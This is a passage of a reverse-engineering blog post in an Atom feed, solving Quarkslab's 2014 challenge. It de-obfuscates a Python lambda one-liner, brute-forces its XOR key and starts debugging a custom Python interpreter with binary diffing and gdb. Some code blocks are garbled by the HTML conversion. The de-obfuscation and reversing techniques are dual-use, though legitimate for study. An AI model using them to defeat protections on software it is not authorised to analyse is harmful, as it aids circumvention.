<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: virtual machine | Diary of a reverse-engineer]]></title>
  <link href="http://doar-e.github.io/blog/categories/virtual-machine/atom.xml" rel="self"/>
  <link href="http://doar-e.github.io/"/>
  <updated>2018-01-15T12:35:45-08:00</updated>
  <id>http://doar-e.github.io/</id>
  <author>
    <name><![CDATA[Axel Souchet, Jonathan Salwan, Jérémy Fetiveau]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Dissection of Quarkslab's 2014 security challenge]]></title>
    <link href="http://doar-e.github.io/blog/2014/09/06/dissection-of-quarkslabs-2014-security-challenge/"/>
    <updated>2014-09-06T20:37:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2014/09/06/dissection-of-quarkslabs-2014-security-challenge</id>
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>As the blog was a bit silent for quite some time, I figured it would be cool to put together a post ; so here it is folks, dig in!</p>

<p>The French company <a href="http://blog.quarkslab.com/you-like-python-security-challenge-and-traveling-win-a-free-ticket-to-hitb-kul.html">Quarkslab</a> <a href="https://twitter.com/quarkslab/status/507457671386394624">recently</a> <a href="https://twitter.com/HITBSecConf/status/507458788522094592">released</a> a security challenge to win a free entrance to attend the upcoming <a href="https://conference.hitb.org/hitbsecconf2014kul/">HITBSecConf</a> conference in Kuala Lumpur from the 13th of October until the 16th.</p>

<p>The challenge has been written by <a href="http://blog.quarkslab.com/author/serge-guelton.html">Serge Guelton</a>, a R&amp;D engineer specialized in compilers/parallel computations. At the time of writing, already eight different people manage to solve the challenge, and one of the ticket seems to have been won by <code>hackedd</code>, so congrats to him!</p>

<p><img class="center" src="/images/dissection_of_quarkslab_s_2014_security_challenge/woot.png"></p>

<p>According to the description of the challenge Python is heavily involved, which is a good thing for at least two reasons:</p>

<ul>
<li>first because I already had <a href="https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/">the occasion</a> to look at its source code in the past,</li>
<li>and because I so am a <a href="https://github.com/0vercl0k/stuffz/tree/master/Python's%20internals">big fan of Python</a>.</li>
</ul>


<p>In this post I will describe how I tackled this problem, how I managed to solve it. And to make up for me being slow at solving it I tried to make it fairly detailed.</p>

<p>At first it was supposed to be quite short though, but well..I decided to analyze fully the challenge even if it wasn&rsquo;t needed to find the key unfortunately, so it is a bit longer than expected :&ndash;).</p>

<p>Anyway, sit down, make yourself at home and let me pour you a cup of tea before we begin :&ndash;).</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>Finding the URL of the challenge</h1>

<h2>Very one-liner, much lambdas, such a pain</h2>

<p>The first part of the challenge is to retrieve an url hidden in the following Python one-liner:</p>

<p>`&ldquo;python Very one-liner, much lambdas
(lambda g, c, d: (lambda <em>: (</em>.<strong>setitem</strong>(&lsquo;$&rsquo;, &rdquo;.join([(<em>[&lsquo;chr&rsquo;] if (&lsquo;chr&rsquo;
in </em>) else chr)((<em>[&lsquo;</em>&rsquo;] if (&lsquo;<em>&rsquo; in </em>) else <em>)) for </em>[&lsquo;<em>&rsquo;] in (</em>[&rsquo;s'] if (&rsquo;s'
in <em>) else s)[::(-1)]])), </em>)[-1])( (lambda <em>: (lambda f, </em>: f(f, <em>))((lambda
__,</em>: ((lambda <em>: <strong>(</strong>, </em>))((lambda <em>: (</em>.<strong>setitem</strong>(&lsquo;i&rsquo;, ((<em>[&lsquo;i&rsquo;] if (&lsquo;i&rsquo;
in </em>) else i) + 1)),<em>)[(-1)])((lambda </em>: (<em>.<strong>setitem</strong>(&rsquo;s',((</em>[&rsquo;s'] if (&rsquo;s'
in <em>) else s) + [((</em>[&lsquo;l&rsquo;] if (&lsquo;l&rsquo; in <em>) else l)[(</em>[&lsquo;i&rsquo;] if (&lsquo;i&rsquo; in <em>) else i
)] ^ (</em>[&lsquo;c&rsquo;] if (&lsquo;c&rsquo; in <em>) else c))])), </em>)[-1])(<em>))) if (((</em>[&lsquo;g&rsquo;] if (&lsquo;g&rsquo; in
<em>) else g) % 4) and ((</em>[&lsquo;i&rsquo;] if (&lsquo;i&rsquo; in <em>) else i)&lt; (</em>[&lsquo;len&rsquo;] if (&lsquo;len&rsquo; in _
) else len)((<em>[&lsquo;l&rsquo;] if (&lsquo;l&rsquo; in </em>) else l)))) else <em>)), </em>) ) ( (lambda <em>: (</em>.
<strong>setitem</strong>(&lsquo;!&rsquo;, []), <em>.<strong>setitem</strong>(&rsquo;s', </em>[&lsquo;!&rsquo;]), <em>)[(-1)] ) ((lambda </em>: (<em>.
<strong>setitem</strong>(&lsquo;!&rsquo;, ((</em>[&rsquo;d'] if (&rsquo;d' in <em>) else d) ^ (</em>[&rsquo;d'] if (&rsquo;d' in <em>) else
d))), </em>.<strong>setitem</strong>(&lsquo;i&rsquo;, <em>[&lsquo;!&rsquo;]), </em>)[(-1)])((lambda <em>: (</em>.<strong>setitem</strong>(&lsquo;!&rsquo;, [
(<em>[&lsquo;j&rsquo;] if (&lsquo;j&rsquo; in </em>) else j) for  <em>[ &lsquo;i&rsquo;] in (</em>[&lsquo;zip&rsquo;] if (&lsquo;zip&rsquo; in <em>) else
zip)((</em>[&lsquo;l0&rsquo;] if (&lsquo;l0&rsquo; in <em>) else l0), (</em>[&lsquo;l1&rsquo;] if (&lsquo;l1&rsquo; in <em>) else l1)) for
</em>[&lsquo;j&rsquo;] in (<em>[&lsquo;i&rsquo;] if (&lsquo;i&rsquo; in </em>) else i)]), <em>.<strong>setitem</strong>(&lsquo;l&rsquo;, </em>[&lsquo;!&rsquo;]), <em>)[-1
])((lambda </em>: (<em>.<strong>setitem</strong>(&lsquo;!&rsquo;, [1373, 1281, 1288, 1373, 1290, 1294, 1375,
1371,1289, 1281, 1280, 1293, 1289, 1280, 1373, 1294, 1289, 1280, 1372, 1288,
1375,1375, 1289, 1373, 1290, 1281, 1294, 1302, 1372, 1355, 1366, 1372, 1302,
1360, 1368, 1354, 1364, 1370, 1371, 1365, 1362, 1368, 1352, 1374, 1365, 1302
]), </em>.<strong>setitem</strong>(&lsquo;l1&rsquo;,<em>[&lsquo;!&rsquo;]), </em>)[-1])((lambda <em>: (</em>.<strong>setitem</strong>(&lsquo;!&rsquo;,[1375,
1368, 1294, 1293, 1373, 1295, 1290, 1373, 1290, 1293, 1280, 1368, 1368,1294,
1293, 1368, 1372, 1292, 1290, 1291, 1371, 1375, 1280, 1372, 1281, 1293,1373,
1371, 1354, 1370, 1356, 1354, 1355, 1370, 1357, 1357, 1302, 1366, 1303,1368,
1354, 1355, 1356, 1303, 1366, 1371]), <em>.<strong>setitem</strong>(&lsquo;l0&rsquo;, </em>[&lsquo;!&rsquo;]), _)[(-1)])</p>

<pre><code>        ({ 'g': g, 'c': c, 'd': d, '$': None})))))))['$'])
</code></pre>

<p>```</p>

<p>I think that was the first time I was seeing obfuscated Python and believe me I did a really strange face when seeing that snippet. But well, with a bit of patience we should manage to get a better understanding of how it is working, let&rsquo;s get to it!</p>

<h2>Tidying up the last one..</h2>

<p>Before doing that here are things we can directly observe just by looking closely at the snippet:</p>

<ul>
<li>We know this function has three arguments ; we don&rsquo;t know them at this point though</li>
<li>The snippet seems to reuse <em>__setitem__</em> quite a lot ; it may mean two things for us:

<ul>
<li>The only standard Python object I know of with a <em>__setitem__</em> function is <em>dictionary</em>,</li>
<li>The way the snippet looks like, it seems that once we will understand one of those <em>__setitem__</em> call, we will understand them all</li>
</ul>
</li>
<li>The following standard functions are used: <em>chr</em>, <em>len</em>, <em>zip</em>

<ul>
<li>That means manipulation of strings, integers and iterables</li>
</ul>
</li>
<li>There are two noticeable operators: <em>mod</em> and <em>xor</em></li>
</ul>


<p>With all that information in our sleeve, the first thing I did was to try to clean it up, starting from the last lambda in the snippet. It gives something like:</p>

<p>```python Last lambda cleaned
tab0 = [</p>

<pre><code>1375, 1368, 1294, 1293, 1373, 1295, 1290, 1373, 1290, 1293,
1280, 1368, 1368, 1294, 1293, 1368, 1372, 1292, 1290, 1291,
1371, 1375, 1280, 1372, 1281, 1293, 1373, 1371, 1354, 1370,
1356, 1354, 1355, 1370, 1357, 1357, 1302, 1366, 1303, 1368,
1354, 1355, 1356, 1303, 1366, 1371
</code></pre>

<p>]</p>

<p>z = lambda x: (</p>

<pre><code>x.__setitem__('!', tab0),
x.__setitem__('l0', x['!']),
x
</code></pre>

<p>)[-1]
```</p>

<p>That lambda takes a dictionary <em>x</em>, sets two items, generates a tuple with a reference to the dictionary at the end of the tuple ; finally the lambda is going to return that same dictionary.
It also uses <em>x[&lsquo;!&rsquo;]</em> as a temporary variable to then assign its value to <em>x[&lsquo;l0&rsquo;]</em>.</p>

<p>Long story short, it basically takes a dictionary, updates it and returns it to the caller: clever trick to pass that same object across lambdas. We can also see that easily in Python directly:</p>

<p><code>text lambda, dictionary &amp; setitem
In [8]: d = {}
In [9]: z(d)
Out[9]:
{'!': [1375,
  ...
 'l0': [1375,
  ...
}
</code></p>

<p>That lambda is even called with a dictionary that will contain, among other things, the three user controlled variable: <em>g</em>, <em>c</em>, <em>d</em>.
That dictionary seems to be some kind of storage used to keep track of all the variables that will be used across those lambdas.</p>

<p>```python lambda &amp; the resulting dictionary</p>

<h1>Returns { &lsquo;g&rsquo; : g, &lsquo;c&rsquo;, &rsquo;d': d, &lsquo;$&rsquo;:None, &lsquo;!&rsquo;:tab0, &lsquo;l0&rsquo;:tab0}</h1>

<p>last_res = (</p>

<pre><code>(
    lambda x: (
        x.__setitem__('!', tab0),
        x.__setitem__('l0', x['!']),
        x
    )[-1]
)
({ 'g': g, 'c': c, 'd': d, '$': None})
</code></pre>

<p>)
```</p>

<h2>..then the one before&hellip;</h2>

<p>Now if we repeat that same operation with the one before the last lambda, we have the exact same pattern:</p>

<p>```python lambda before the last one
tab1 = [</p>

<pre><code>1373, 1281, 1288, 1373, 1290, 1294, 1375, 1371, 1289, 1281,
1280, 1293, 1289, 1280, 1373, 1294, 1289, 1280, 1372, 1288,
1375, 1375, 1289, 1373, 1290, 1281, 1294, 1302, 1372, 1355,
1366, 1372, 1302, 1360, 1368, 1354, 1364, 1370, 1371, 1365,
1362, 1368, 1352, 1374, 1365, 1302
</code></pre>

<p>]</p>

<p>zz = lambda x: (</p>

<pre><code>x.__setitem__('!', tab1),
x.__setitem__('l1', x['!']),
x
</code></pre>

<p>)[-1]
```</p>

<p>Perfect, now let&rsquo;s repeat the same operations over and over again. At some point, the whole thing becomes crystal clear (sort-of):</p>

<p>```python cleaned nested lambdas</p>

<h1>Returns {</h1>

<p>  # &lsquo;g&rsquo;:g, &lsquo;c&rsquo;:c, &rsquo;d':d,
  # &lsquo;!&rsquo;:[],
  # &rsquo;s':[],
  # &lsquo;l&rsquo;:[j for i in zip(tab0, tab1) for j in i],
  # &lsquo;l1&rsquo;:tab1,
  # &lsquo;l0&rsquo;:tab0,
  # &lsquo;i&rsquo;: 0,
  # &lsquo;j&rsquo;: 1302,
  # &lsquo;$&rsquo;:None</p>

<h1>}</h1>

<p>res_after_all_operations = (
  (</p>

<pre><code>lambda x: (
    x.__setitem__('!', []),
    x.__setitem__('s', x['!']),
    x
)[-1]
</code></pre>

<p>  )
  # ..
  (</p>

<pre><code>(
  lambda x: (
      x.__setitem__('!', ((x['d'] if ('d' in x) else d) ^ (x['d'] if ('d' in x) else d))),
      x.__setitem__('i', x['!']),
      x
  )[-1]
)
# ..
(
  (
    lambda x: (
        x.__setitem__('!', [(x['j'] if ('j' in x) else j) for x[ 'i'] in (x['zip'] if ('zip' in x) else zip)((x['l0'] if ('l0' in x) else l0), (x['l1'] if ('l1' in x) else l1)) for x['j'] in (x['i'] if ('i' in x) else i)]),
        x.__setitem__('l', x['!']),
        x
    )[-1]
  )
  # Returns { 'g':g, 'c':c, 'd':d, '!':tab1, 'l1':tab1, 'l0':tab0, '$':None}
  (
    (
      lambda x: (
          x.__setitem__('!', tab1),
          x.__setitem__('l1', x['!']),
          x
      )[-1]
    )
    # Return { 'g' : g, 'c', 'd': d, '!':tab0, 'l0':tab0, '$':None }
    (
      (
        lambda x: (
            x.__setitem__('!', tab0),
            x.__setitem__('l0', x['!']),
            x
        )[-1]
      )
      ({ 'g': g, 'c': c, 'd': d, '$': None})
    )
  )
)
</code></pre>

<p>  )
)
```</p>

<h2>Putting it all together</h2>

<p>After doing all of that, we know now the types of the three variables the function needs to work properly (and we don&rsquo;t really need more to be honest):</p>

<ul>
<li><em>g</em> is an integer that will be mod 4

<ul>
<li>if the value is divisible by 4, the function returns nothing ; so we will need to have this variable sets to 1 for example</li>
</ul>
</li>
<li><em>c</em> is another integer that looks like a xor key ; if we look at the snippet, this variable is used to xor each byte of <em>x[&lsquo;l&rsquo;]</em> (which is the table with tab0 and tab1)

<ul>
<li>this is the interesting parameter</li>
</ul>
</li>
<li><em>d</em> is another integer that we can also ignore: it&rsquo;s only used to set <em>x[&lsquo;i&rsquo;]</em> to zero by xoring <em>x[&rsquo;d']</em> by itself.</li>
</ul>


<p>We don&rsquo;t need anything else really now: no more lambdas, no more pain, no more tears. It is time to write what I call, an <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/bf_with_lambdas_cleaned.py"><em>educated</em> brute-forcer</a>, to find the correct value of <em>c</em>:
```python bf_with_lambdas_cleaned.py
import sys</p>

<p>def main(argc, argv):</p>

<pre><code>tab0 = [1375, 1368, 1294, 1293, 1373, 1295, 1290, 1373, 1290, 1293, 1280, 1368, 1368,1294, 1293, 1368, 1372, 1292, 1290, 1291, 1371, 1375, 1280, 1372, 1281, 1293,1373, 1371, 1354, 1370, 1356, 1354, 1355, 1370, 1357, 1357, 1302, 1366, 1303,1368, 1354, 1355, 1356, 1303, 1366, 1371]
tab1 = [1373, 1281, 1288, 1373, 1290, 1294, 1375, 1371,1289, 1281, 1280, 1293, 1289, 1280, 1373, 1294, 1289, 1280, 1372, 1288, 1375,1375, 1289, 1373, 1290, 1281, 1294, 1302, 1372, 1355, 1366, 1372, 1302, 1360, 1368, 1354, 1364, 1370, 1371, 1365, 1362, 1368, 1352, 1374, 1365, 1302]

func = (
    lambda g, c, d: 
    (
        lambda x: (
            x.__setitem__('$', ''.join([(x['chr'] if ('chr' in x) else chr)((x['_'] if ('_' in x) else x)) for x['_'] in (x['s'] if ('s' in x) else s)[::-1]])),
            x
        )[-1]
    )
    (
        (
            lambda x: 
                (lambda f, x: f(f, x))
            (
                (
                    lambda __, x: 
                    (
                        (lambda x: __(__, x))
                        (
                            # i += 1
                            (
                                lambda x: (
                                    x.__setitem__('i', ((x['i'] if ('i' in x) else i) + 1)),
                                    x
                                )[-1]
                            )
                            (
                                # s += [c ^ l[i]]
                                (
                                    lambda x: (
                                        x.__setitem__('s', (
                                                (x['s'] if ('s' in x) else s) +
                                                [((x['l'] if ('l' in x) else l)[(x['i'] if ('i' in x) else i)] ^ (x['c'] if ('c' in x) else c))]
                                            )
                                        ),
                                        x
                                    )[-1]
                                )
                                (x)
                            )
                        )
                        # if ((x['g'] % 4) and (x['i'] &lt; len(l))) else x
                        if (((x['g'] if ('g' in x) else g) % 4) and ((x['i'] if ('i' in x) else i)&lt; (x['len'] if ('len' in x) else len)((x['l'] if ('l' in x) else l))))
                        else x
                    )
                ),
                x
            )
        )
        # Returns { 'g':g, 'c':c, 'd':d, '!':zip(tab1, tab0), 'l':zip(tab1, tab0), l1':tab1, 'l0':tab0, 'i': 0, 'j': 1302, '!':0, 's':[] }
        (
            (
                lambda x: (
                    x.__setitem__('!', []),
                    x.__setitem__('s', x['!']),
                    x
                )[-1]
            )
            # Returns { 'g':g, 'c':c, 'd':d, '!':zip(tab1, tab0), 'l':zip(tab1, tab0), l1':tab1, 'l0':tab0, 'i': 0, 'j': 1302, '!':0}
            (
                (
                    lambda x: (
                        x.__setitem__('!', ((x['d'] if ('d' in x) else d) ^ (x['d'] if ('d' in x) else d))),
                        x.__setitem__('i', x['!']),
                        x
                    )[-1]
                )
                # Returns { 'g' : g, 'c', 'd': d, '!':zip(tab1, tab0), 'l':zip(tab1, tab0), l1':tab1, 'l0':tab0, 'i': (1371, 1302), 'j': 1302}
                (
                    (
                        lambda x: (
                            x.__setitem__('!', [(x['j'] if ('j' in x) else j) for x[ 'i'] in (x['zip'] if ('zip' in x) else zip)((x['l0'] if ('l0' in x) else l0), (x['l1'] if ('l1' in x) else l1)) for x['j'] in (x['i'] if ('i' in x) else i)]),
                            x.__setitem__('l', x['!']),
                            x
                        )[-1]
                    )
                    # Returns { 'g' : g, 'c', 'd': d, '!':tab1, 'l1':tab1, 'l0':tab0}
                    (
                        (
                            lambda x: (
                                x.__setitem__('!', tab1),
                                x.__setitem__('l1', x['!']),
                                x
                            )[-1]
                        )
                        # Return { 'g' : g, 'c', 'd': d, '!' : tab0, 'l0':tab0}
                        (
                            (
                                lambda x: (
                                    x.__setitem__('!', tab0),
                                    x.__setitem__('l0', x['!']),
                                    x
                                )[-1]
                            )
                            ({ 'g': g, 'c': c, 'd': d, '$': None})
                        )
                    )
                )
            )
        )
    )['$']
)

for i in range(0x1000):
    try:
        ret = func(1, i, 0)
        if 'quarks' in ret:
            print ret
    except:
        pass
return 1
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code>sys.exit(main(len(sys.argv), sys.argv))
</code></pre>

<p>```</p>

<p>And after running it, we are good to go:
<code>text w00tw00t
D:\Codes\challenges\ql-python&gt;bf_with_lambdas_cleaned.py
/blog.quarkslab.com/static/resources/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</code></p>

<h1>A custom ELF64 Python interpreter you shall debug</h1>

<h2>Recon</h2>

<p>All right, here we are: we now have the real challenge. First, let&rsquo;s see what kind of information we get for free:
<code>bash recon
overclok@wildout:~/chall/ql-py$ file b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs),
for GNU/Linux 2.6.26, not stripped
overclok@wildout:~/chall/ql-py$ ls -lah b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
-rwxrw-r-x 1 overclok overclok 7.9M Sep  8 21:03 b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</code></p>

<p>The binary is quite big, not good for us. But on the other hand, the binary isn&rsquo;t stripped so we might find useful debugging information at some point.</p>

<p>```bash ./b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
overclok@wildout:~/chall/ql-py$ /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
[GCC 4.8.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>```</p></blockquote></blockquote></blockquote>

<p>That does explain the size of the binary then: we basically have something that looks like a custom Python interpreter. Note that I also remembered reading <em><a href="http://blog.quarkslab.com/building-an-obfuscated-python-interpreter-we-need-more-opcodes.html">Building an obfuscated Python interpreter: we need more opcodes</a></em> on <em>Quarkslab</em>&rsquo;s blog where Serge described how you could tweak the interpreter sources to add / change some opcodes either for optimization or obfuscation purposes.</p>

<h2>Finding the interesting bits</h2>

<p>The next step is to figure out what part of the binary is interesting, what functions have been modified, and where we find the problem we need to solve to get the flag. My idea for that was to use a <em>binary-diffing</em> tool between an original <em>Python278</em> interpreter and the one we were given.</p>

<p>To do so I just grabbed <em>Python278</em>&rsquo;s sources and compiled them by myself:</p>

<p><code>bash compiling Py278
overclok@wildout:~/chall/ql-py$ wget https://www.python.org/ftp/python/2.7.8/Python-2.7.8.tgz &amp;&amp; tar xzvf Python-2.7.8.tgz
overclok@wildout:~/chall/ql-py$ tar xzvf Python-2.7.8.tgz
overclok@wildout:~/chall/ql-py$ cd Python-2.7.8/ &amp;&amp; ./configure &amp;&amp; make
overclok@wildout:~/chall/ql-py/Python-2.7.8$ ls -lah ./python
-rwxrwxr-x 1 overclok overclok 8.0M Sep  5 00:13 ./python
</code></p>

<p>The resulting binary has a similar size, so it should do the job even if I&rsquo;m not using <em>GCC 4.8.2</em> and the same compilation/optimization options. To perform the <em>diffing</em> I used <em>IDA Pro</em> and <a href="https://code.google.com/p/patchdiff2/">Patchdiff v2.0.10</a>.</p>

<h2>```text Patchdiff result</h2>

<p>PatchDiff Plugin v2.0.10
Copyright &copy; 2010-2011, Nicolas Pouvesle</p>

<h2>Copyright &copy; 2007-2009, Tenable Network Security, Inc</h2>

<p>Scanning for functions &hellip;
parsing second idb&hellip;
parsing first idb&hellip;
diffing&hellip;
Identical functions:   2750
Matched functions:     176
Unmatched functions 1: 23
Unmatched functions 2: 85
done!
```</p>

<p>Once the tool has finished its analysis we just have to check the list of unmatched function names (around one hundred of them, so it&rsquo;s pretty quick), and eventually we see that:</p>

<p><img class="center" src="/images/dissection_of_quarkslab_s_2014_security_challenge/initdo_not_run_me.png"></p>

<p>That function directly caught my eyes (you can even check it doesn&rsquo;t exist in the <em>Python278</em> source tree obviously :&ndash;)), and it appears this function is just setting up a Python module called <em>do_not_run_me</em>.</p>

<p><img class="center" src="/images/dissection_of_quarkslab_s_2014_security_challenge/initdonotrunme_assembly.png"></p>

<p>Let&rsquo;s import it:</p>

<p>```python do_not_run_me module
overclok@wildout:~/chall/ql-py$ /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
iPython 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
[GCC 4.8.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>import do_not_run_me
print do_not_run_me.<strong>doc</strong>
None
dir(do_not_run_me)
[&lsquo;<strong>doc</strong>&rsquo;, &lsquo;<strong>name</strong>&rsquo;, &lsquo;<strong>package</strong>&rsquo;, &lsquo;run_me&rsquo;]
print do_not_run_me.run_me.<strong>doc</strong>
There are two kinds of people in the world: those who say there is no such thing as infinite recursion, and those who say ``There are two kinds of people in the world: those who say there is no such thing as infinite recursion, and those who say &hellip;
do_not_run_me.run_me(&lsquo;doar-e&rsquo;)
Segmentation fault
```</p></blockquote></blockquote></blockquote>

<p>All right, we now have something to look at and we are going to do so from a low level point of view because that&rsquo;s what I like ; so don&rsquo;t expect big/magic hacks here :).</p>

<p>If you are not really familiar with Python&rsquo;s VM structures I would advise you to read quickly through this article <em><a href="https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/">Deep Dive Into Python’s VM: Story of LOAD_CONST Bug</a></em>, and you should be all set for the next parts.</p>

<h2>do_not_run_me.run_me</h2>

<p>The function is quite small, so it should be pretty quick to analyze:</p>

<ol>
<li>the first part makes sure that we pass a string as an argument when calling <em>run_me</em>,</li>
<li>then a custom <em>marshaled</em> function is loaded, a function is created out of it, and called,</li>
<li>after that it creates another function from the string we pass to the function (which explains the <em>segfault</em> just above),</li>
<li>finally, a last function is created from another hardcoded <em>marshaled</em> string.</li>
</ol>


<h3>First marshaled function</h3>

<p>To understand it we have to dump it first, to unmarshal it and to analyze the resulting code object:</p>

<p>```text unmarshaling the first function
overclok@wildout:~/chall/ql-py$ gdb -q /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
Reading symbols from /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf&hellip;done.
gdb$ set disassembly-flavor intel
gdb$ disass run_me
Dump of assembler code for function run_me:
   0x0000000000513d90 &lt;+0>:     push   rbp
   0x0000000000513d91 &lt;+1>:     mov    rdi,rsi
   0x0000000000513d94 &lt;+4>:     xor    eax,eax
   0x0000000000513d96 &lt;+6>:     mov    esi,0x56c70b
   0x0000000000513d9b &lt;+11>:    push   rbx
   0x0000000000513d9c &lt;+12>:    sub    rsp,0x28
   0x0000000000513da0 &lt;+16>:    lea    rcx,[rsp+0x10]
   0x0000000000513da5 &lt;+21>:    mov    rdx,rsp</p>

<p>   ; Parses the arguments we gave, it expects a string object
   0x0000000000513da8 &lt;+24>:    call   0x4cf430 &lt;PyArg_ParseTuple>
   0x0000000000513dad &lt;+29>:    xor    edx,edx
   0x0000000000513daf &lt;+31>:    test   eax,eax
   0x0000000000513db1 &lt;+33>:    je     0x513e5e &lt;run_me+206></p>

<p>   0x0000000000513db7 &lt;+39>:    mov    rax,QWORD PTR [rip+0x2d4342]
   0x0000000000513dbe &lt;+46>:    mov    esi,0x91
   0x0000000000513dc3 &lt;+51>:    mov    edi,0x56c940
   0x0000000000513dc8 &lt;+56>:    mov    rax,QWORD PTR [rax+0x10]
   0x0000000000513dcc &lt;+60>:    mov    rbx,QWORD PTR [rax+0x30]</p>

<p>   ; Creates a code object from the marshaled string
   ; PyObject<em> PyMarshal_ReadObjectFromString(char </em>string, Py_ssize_t len)
   0x0000000000513dd0 &lt;+64>:    call   0x4dc020 &lt;PyMarshal_ReadObjectFromString>
   0x0000000000513dd5 &lt;+69>:    mov    rdi,rax
   0x0000000000513dd8 &lt;+72>:    mov    rsi,rbx</p>

<p>   ; Creates a function object from the marshaled string
   0x0000000000513ddb &lt;+75>:    call   0x52c630 &lt;PyFunction_New>
   0x0000000000513de0 &lt;+80>:    xor    edi,edi
[&hellip;]
gdb$ r -c &lsquo;import do_not_run_me as v; v.run_me(&ldquo;&rdquo;)&rsquo;
Starting program: /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf -c &lsquo;import do_not_run_me as v; v.run_me(&ldquo;&rdquo;)&rsquo;
[&hellip;]
```</p>

<p>To start, we can set two software breakpoints <em>@0x0000000000513dd0</em> and <em>@0x0000000000513dd5</em> to inspect both the marshaled string and the resulting code object.</p>

<p>Just a little reminder though on the <em>Linux/x64 ABI</em>: &ldquo;The first six integer or pointer arguments are passed in registers RDI, RSI, RDX, RCX, R8, and R9&rdquo;.</p>

<p><code>text unmarshaled string inspection
gdb$ p /x $rsi
$2 = 0x91
gdb$ x/145bx $rdi
0x56c940 &lt;+00&gt;:  0x63    0x00    0x00    0x00    0x00    0x01    0x00    0x00
0x56c948 &lt;+08&gt;:  0x00    0x02    0x00    0x00    0x00    0x43    0x00    0x00
0x56c950 &lt;+16&gt;:  0x00    0x73    0x14    0x00    0x00    0x00    0x64    0x01
0x56c958 &lt;+24&gt;:  0x00    0x87    0x00    0x00    0x7c    0x00    0x00    0x64
0x56c960 &lt;+32&gt;:  0x01    0x00    0x3c    0x61    0x00    0x00    0x7c    0x00
0x56c968 &lt;+40&gt;:  0x00    0x1b    0x28    0x02    0x00    0x00    0x00    0x4e
0x56c970 &lt;+48&gt;:  0x69    0x01    0x00    0x00    0x00    0x28    0x01    0x00
0x56c978 &lt;+56&gt;:  0x00    0x00    0x74    0x04    0x00    0x00    0x00    0x54
0x56c980 &lt;+64&gt;:  0x72    0x75    0x65    0x28    0x01    0x00    0x00    0x00
0x56c988 &lt;+72&gt;:  0x74    0x0e    0x00    0x00    0x00    0x52    0x6f    0x62
0x56c990 &lt;+80&gt;:  0x65    0x72    0x74    0x5f    0x46    0x6f    0x72    0x73
0x56c998 &lt;+88&gt;:  0x79    0x74    0x68    0x28    0x00    0x00    0x00    0x00
0x56c9a0 &lt;+96&gt;:  0x28    0x00    0x00    0x00    0x00    0x73    0x10    0x00
0x56c9a8 &lt;+104&gt;: 0x00    0x00    0x6f    0x62    0x66    0x75    0x73    0x63
0x56c9b0 &lt;+112&gt;: 0x61    0x74    0x65    0x2f    0x67    0x65    0x6e    0x2e
0x56c9b8 &lt;+120&gt;: 0x70    0x79    0x74    0x03    0x00    0x00    0x00    0x66
0x56c9c0 &lt;+128&gt;: 0x6f    0x6f    0x05    0x00    0x00    0x00    0x73    0x06
0x56c9c8 &lt;+136&gt;: 0x00    0x00    0x00    0x00    0x01    0x06    0x02    0x0a
0x56c9d0 &lt;+144&gt;: 0x01
</code></p>

<p>And obviously you can&rsquo;t use the Python <em>marshal</em> module to load &amp; inspect the resulting object as the author seems to have removed the methods <em>loads</em> and <em>dumps</em>:</p>

<p>```text fuu
overclok@wildout:~/chall/ql-py$ /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
[GCC 4.8.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>import marshal
dir(marshal)
[&lsquo;<strong>doc</strong>&rsquo;, &lsquo;<strong>name</strong>&rsquo;, &lsquo;<strong>package</strong>&rsquo;, &lsquo;version&rsquo;]
```</p></blockquote></blockquote></blockquote>

<p>We could still try to run the marshaled string in our fresh compiled original Python though:
```python unmarshal in an original Python278</p>

<blockquote><blockquote><blockquote><p>import marshal
